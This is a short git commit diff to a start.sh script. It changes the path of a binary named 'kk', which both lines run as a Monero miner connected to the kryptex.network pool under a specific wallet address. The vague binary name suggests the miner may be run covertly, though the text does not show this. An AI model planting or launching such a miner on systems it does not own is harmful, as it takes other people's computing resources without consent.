45a5811939a533556cd71160fa71d372adb3f28e
Marat Nedogimov <56220501+nedogimov@users.noreply.github.com>
2021-02-27 14:38:57 +0500

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,1 +1,1 @@
-/root/kk --url xmr.kryptex.network:7000 --user 874CsAXxxTmWddUgkyW8xqHPUeYGYsDKQWhQCZKphsHdH4KAR2XAakAP3sCn9qHz5Pbvti8NVYQJR1BaxmruQ3KDPHQqXVY.v2db8a24b2 -p x --coin XMR --randomx-1gb-pages
+./kk --url xmr.kryptex.network:7000 --user 874CsAXxxTmWddUgkyW8xqHPUeYGYsDKQWhQCZKphsHdH4KAR2XAakAP3sCn9qHz5Pbvti8NVYQJR1BaxmruQ3KDPHQqXVY.v2db8a24b2 -p x --coin XMR --randomx-1gb-pages
